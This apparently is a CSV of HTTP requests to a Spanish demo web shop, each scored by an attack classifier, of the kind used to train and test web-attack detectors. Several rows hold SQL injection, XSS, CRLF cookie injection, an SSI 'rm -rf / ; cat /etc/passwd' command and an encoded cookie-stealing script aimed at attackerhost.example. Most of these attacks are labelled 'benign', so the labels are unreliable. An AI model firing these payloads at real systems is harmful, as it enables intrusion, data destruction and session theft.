row_idx,text,pred_label,max_prob
5395,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modoA=registro&login=beth&password=romanizar&nombre=Numa&apellidos=Villalta+Tapasco&email=modica%40boda-barata.kw&dni=35697894P&direccion=Masia+Can+Pere+Riera+Petit+14%2C+&ciudad=Xove&cp=05560&provincia=Cantabria&ntc=3116780523679392&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9641464352607727
5396,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
5397,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2=Vaciar+carrito%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- PROTOCOL=HTTP/1.1,benign,0.6190947890281677
5398,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
5399,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
5400,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
5401,METHOD=GET PATH=/iisadmin/htmldocs/iisdocs.htm QUERY= PROTOCOL=HTTP/1.1,benign,0.40041661262512207
5402,METHOD=GET PATH=/tienda1/miembros.inc QUERY= PROTOCOL=HTTP/1.1,benign,0.5410972833633423
5403,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=widuch&password=7AM2R0%CD502&nombre=Aladino&apellidos=Iriarte+Porres&email=gahan_boorman%40eneltajo.tt&dni=93685529C&direccion=Pl.+Del+Mexuar%2C+179%2C+1-D&ciudad=%3F&cp=26288&provincia=Soria&ntc=5513132638351756&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9714056849479675
5404,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
5405,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=widuch&password=7AM2R0%CD502&nombre=Aladino&apellidos=Covarru%2Fbias&email=gahan_boorman%40eneltajo.tt&dni=93685529C&direccion=Pl.+Del+Mexuar%2C+179%2C+1-D&ciudad=Ordizia&cp=26288&provincia=Soria&ntc=5513132638351756&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9644330739974976
5406,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
5407,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=widuch&password=7AM2R0%CD502&nombre=Aladino&apellidos=Iriarte+Porres&email=gahan_boorman%40eneltajo.tt&dni=93685529C&direccion=Pl.+Del+Mexuar%2C+179%2C+1-D&ciudadA=Ordizia&cp=26288&provincia=Soria&ntc=5513132638351756&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9629634618759155
5408,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
5409,METHOD=GET PATH=/tienda1/miembros/editar.jsp/asf-logo-wide.gif QUERY= PROTOCOL=HTTP/1.1,benign,0.6220332384109497
5410,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
5411,METHOD=GET PATH=/iissamples/dfault/samples.asp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.36604243516921997
5412,METHOD=GET PATH=/tienda1/imagenes/2.gif.OLD QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4700792729854584
5413,METHOD=GET PATH=/tienda1/imagenes/3.gif/asf-logo-wide.gif QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42103415727615356
5414,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=2&nombre=Queso+Manchego&precio=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&cantidad=53&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7626861929893494
5415,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
5416,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=diffie&pwd=Cayar%ED&remember=off&B1=Entrar%27INJECTED_PARAM PROTOCOL=HTTP/1.1,benign,0.7967813611030579
5417,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
5418,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=ko%2Clo%3Fs&pwd=Cayar%ED&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8106763958930969
5419,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
5420,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modoA=entrar&login=diffie&pwd=Cayar%ED&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8064593076705933
5421,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
5422,METHOD=GET PATH=/asf-logo-wide.gif/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42968156933784485
5423,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=2%3F PROTOCOL=HTTP/1.1,benign,0.4152732789516449
5424,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
5425,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E PROTOCOL=HTTP/1.1,benign,0.5705172419548035
5426,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
5427,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=2 PROTOCOL=HTTP/1.1,benign,0.42545053362846375
5428,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
5429,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp.Inc QUERY= PROTOCOL=HTTP/1.1,benign,0.413948118686676
5430,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=Credenciales+incorrectas%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- PROTOCOL=HTTP/1.1,benign,0.6652641296386719
5431,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
5432,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
5433,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
5434,METHOD=GET PATH=/webapp/examples/showcfg QUERY= PROTOCOL=HTTP/1.1,benign,0.37248626351356506
5435,METHOD=GET PATH=/tienda1/publico/miembros.jsp/asf-logo-wide.gif/.old QUERY= PROTOCOL=HTTP/1.1,benign,0.6449293494224548
5436,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&precio=8166&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.768394410610199
5437,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
5438,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=8166&B1=Confirmar%2F PROTOCOL=HTTP/1.1,benign,0.712906002998352
5439,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
5440,METHOD=GET PATH=/tienda1/publico/pagar.jsp/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,benign,0.557738721370697
5441,METHOD=PUT PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5984482765197754
5442,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=cash3&password=desfacci%F3n&nombre=Eraldo&apellidos=Varela+Pulido&email=salminen_chew%40suardistec.tw&dni=16864786J&direccion=C%2F+Chalaneros%2C+188%2C+12-E&ciudad=Junta+de+Villalba+de+Losa&cp=08787&provincia=N%3Fava*rra&ntc=4545565224454291&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9679484367370605
5443,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
5444,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modoA=registro&login=cash3&password=desfacci%F3n&nombre=Eraldo&apellidos=Varela+Pulido&email=salminen_chew%40suardistec.tw&dni=16864786J&direccion=C%2F+Chalaneros%2C+188%2C+12-E&ciudad=Junta+de+Villalba+de+Losa&cp=08787&provincia=Guadalajara&ntc=4545565224454291&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9661305546760559
5445,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
5446,METHOD=GET PATH=/tienda1/publico/registro.jsp.Old QUERY= PROTOCOL=HTTP/1.1,benign,0.6003445386886597
5447,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
5448,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
5449,METHOD=GET PATH=/tienda1/global/creditos.jsp/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5526963472366333
5450,METHOD=GET PATH=/tienda1/global/creditos.jsp.INC QUERY= PROTOCOL=HTTP/1.1,benign,0.5375125408172607
5451,METHOD=GET PATH=/tienda1/miembros/imagenes/ogono.jpg.java QUERY= PROTOCOL=HTTP/1.1,benign,0.7170430421829224
5452,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=bernarr&password=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&nombre=Uriel&apellidos=Cloquell+Pesarrodona&email=moorehead-hamlett%40touringa.pw&dni=64688843D&direccion=Pl.+La+Merced%2C+107+4C&ciudad=Cuarte+de+Huerva&cp=19420&provincia=Teruel&ntc=4593991243170323&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9423045516014099
5453,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
5454,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=%27%2Cfi%2Flberto0&password=gordana&nombre=Uriel&apellidos=Cloquell+Pesarrodona&email=moorehead-hamlett%40touringa.pw&dni=64688843D&direccion=Pl.+La+Merced%2C+107+4C&ciudad=Cuarte+de+Huerva&cp=19420&provincia=Teruel&ntc=4593991243170323&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9735562801361084
5455,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
5456,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modoA=registro&login=bernarr&password=gordana&nombre=Uriel&apellidos=Cloquell+Pesarrodona&email=moorehead-hamlett%40touringa.pw&dni=64688843D&direccion=Pl.+La+Merced%2C+107+4C&ciudad=Cuarte+de+Huerva&cp=19420&provincia=Teruel&ntc=4593991243170323&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9720444083213806
5457,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
5458,METHOD=GET PATH=/_vti_script/ QUERY= PROTOCOL=HTTP/1.1,command_exec,0.3529554605484009
5459,METHOD=GET PATH=/tienda1/miembros/fotos.jsp/asf-logo-wide.gif.bak QUERY= PROTOCOL=HTTP/1.1,benign,0.715080738067627
5460,METHOD=GET PATH=/tienda1/asf-logo-wide.gif QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45107513666152954
5461,METHOD=GET PATH=/tienda1/miembros/salir.jsp/.Old QUERY= PROTOCOL=HTTP/1.1,benign,0.7079053521156311
5462,METHOD=GET PATH=/tienda1/imagenes/3.gif/6909030637832563290.jsp~ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.36276423931121826
5463,METHOD=GET PATH=/scripts/tools/newdsn.exe QUERY= PROTOCOL=HTTP/1.1,benign,0.47727543115615845
5464,METHOD=GET PATH=/asf-logo-wide.gif/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42968156933784485
5465,METHOD=GET PATH=/tienda1/imagenes/logo.gif~ QUERY= PROTOCOL=HTTP/1.1,benign,0.43886464834213257
5466,METHOD=GET PATH=/examplesWebApp/WebservicesEJB.jsp QUERY= PROTOCOL=HTTP/1.1,command_exec,0.367302268743515
5467,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Vino+Riojaany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=100&cantidad=53&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6878610253334045
5468,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
5469,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1%2F&nombre=Vino+Rioja&precio=100&cantidad=53&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6504918932914734
5470,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
5471,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Vino+Rioja&precio=100&cantidadA=53&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6577798128128052
5472,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
5473,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&pwd=9r5sti22r00a&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7992585897445679
5474,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
5475,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=calley&pwd=9r5sti22r00a&remember=off%2F&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8019886016845703
5476,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
5477,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=calley&pwd=9r5sti22r00a&rememberA=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.800875723361969
5478,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
5479,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=1%2500 PROTOCOL=HTTP/1.1,benign,0.4446769654750824
5480,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
5481,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=%2B PROTOCOL=HTTP/1.1,benign,0.4308592975139618
5482,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
5483,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=1 PROTOCOL=HTTP/1.1,benign,0.4123231768608093
5484,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
5485,METHOD=GET PATH=/samples/htmlsamp/styles2.htm QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.35643789172172546
5486,METHOD=GET PATH=/samples/sampsite/sampsite.htm QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3575470447540283
5487,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
5488,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
5489,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=1692&B1=Confirmar%2F PROTOCOL=HTTP/1.1,benign,0.7010334134101868
5490,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
5491,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modoA=insertar&precio=1692&B1=Pasar+por+caja PROTOCOL=HTTP/1.1,benign,0.6928967237472534
5492,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
5493,METHOD=GET PATH=/tienda1/publico/pagar.jsp~ QUERY= PROTOCOL=HTTP/1.1,benign,0.46983668208122253
5494,METHOD=GET PATH=/tienda1/publico/productos.jsp/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,benign,0.5494616627693176
5495,METHOD=GET PATH=/tienda1/publico/productos.jsp.bak QUERY= PROTOCOL=HTTP/1.1,benign,0.5657587647438049
5496,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=celestin&password=acetOSi0La&nombre=Constantino&apellidos=Veneroso+De+Manuel&email=funato%40psychominders.co&dni=82399457W&direccion=Avda.+Lagunas+De+Ruidera%2C+70%2C+5%3FE&ciudad=Pesoz&cp=12449&provincia=Le%F3n&ntc=971364397960361&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9666697978973389
5497,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
5498,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2=Vaciar+carrito%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E PROTOCOL=HTTP/1.1,benign,0.6119340658187866
5499,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
5500,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E PROTOCOL=HTTP/1.1,benign,0.5718162059783936
5501,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
5502,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
5503,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.45179665088653564
5504,METHOD=GET PATH=/tienda1/publico/vaciar.jsp/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,benign,0.5415344834327698
5505,METHOD=GET PATH=/msadc/msadcs.dll QUERY= PROTOCOL=HTTP/1.1,benign,0.3748033046722412
5506,METHOD=GET PATH=/6909030637832563290.jsp QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.34937310218811035
5507,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=furuta&password=f3ci0e0368&nombre=Yohana&apellidos=Lladonosa+Uchuya&email=starrelt-stafford%40ajedrezconmaestros.sa%22+AND+%221%22%3D%221&dni=41407341G&direccion=Camarotes%2C+144%2C+&ciudad=Salares&cp=37216&provincia=Valladolid&ntc=8395637658753936&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9700440168380737
5508,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
5509,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=furuta&password=f3ci0e0368&nombre=Yohana&apellidos=Lladonosa+Uchuya&email=baker%40pasaje%40saereosbar%40ato%40s.in&dni=41407341G&direccion=Camarotes%2C+144%2C+&ciudad=Salares&cp=37216&provincia=Valladolid&ntc=8395637658753936&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9732246994972229
5510,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
5511,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=furuta&password=f3ci0e0368&nombre=Yohana&apellidos=Lladonosa+Uchuya&email=starrelt-stafford%40ajedrezconmaestros.sa&dni=41407341G&direccionA=Camarotes%2C+144%2C+&ciudad=Salares&cp=37216&provincia=Valladolid&ntc=8395637658753936&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.974033772945404
5512,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
5513,METHOD=GET PATH=/tienda1/miembros/.INC QUERY= PROTOCOL=HTTP/1.1,benign,0.6251860857009888
5514,METHOD=GET PATH=/tienda1/miembros/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,benign,0.7414082288742065
5515,METHOD=GET PATH=/tienda1/imagenes/2.gif.Old QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.447270005941391
5516,METHOD=GET PATH=/tienda1/imagenes.OLD QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3949839770793915
5517,METHOD=GET PATH=/tienda1/imagenes/4861362529278789730.Inc QUERY= PROTOCOL=HTTP/1.1,benign,0.42777910828590393
5518,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Vino+Rioja&precio=85&cantidad=80%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7522763013839722
5519,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
5520,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&precio=85&cantidad=80&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6818609833717346
5521,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
5522,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Ques%2Bo+Manchego&precio=85&cantidad=80&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7040755152702332
5523,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
5524,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Vino+Rioja&precio=85&cantidadA=80&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6596035361289978
5525,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
5526,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=haze*l&pwd=pluvi%F3metro&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7878714203834534
5527,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
5528,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=brough&pwd=pluvi%F3metro&remember=off&B1A=Entrar PROTOCOL=HTTP/1.1,benign,0.8054890036582947
5529,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
5530,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- PROTOCOL=HTTP/1.1,benign,0.5423515439033508
5531,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
5532,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=2 PROTOCOL=HTTP/1.1,benign,0.42545053362846375
5533,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
5534,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp.Old QUERY= PROTOCOL=HTTP/1.1,benign,0.46179723739624023
5535,METHOD=GET PATH=/tienda1/publico/carrito.jsp/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,benign,0.5521746873855591
5536,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org PROTOCOL=HTTP/1.1,benign,0.6853834390640259
5537,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
5538,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
5539,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
5540,METHOD=GET PATH=/CFIDE/administrator/linkdirect.cfm QUERY= PROTOCOL=HTTP/1.1,benign,0.46384966373443604
5541,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=4954&B1=Confirmar%2F PROTOCOL=HTTP/1.1,benign,0.6914966702461243
5542,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
5543,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
5544,METHOD=GET PATH=/CFIDE/administrator/left.cfm QUERY= PROTOCOL=HTTP/1.1,benign,0.4663574695587158
5545,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=tsern&password=S87abOC9do4&nombre=Nadir&apellidos=Ganci+Zanuy&email=wolfstone%40g-audio.a%40ero&dni=01364603J&direccion=Carrer+Sant+Antoni%2C+S%2FN+&ciudad=Torre+del+Bierzo&cp=33780&provincia=Ourense&ntc=6172384858877900&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9601356387138367
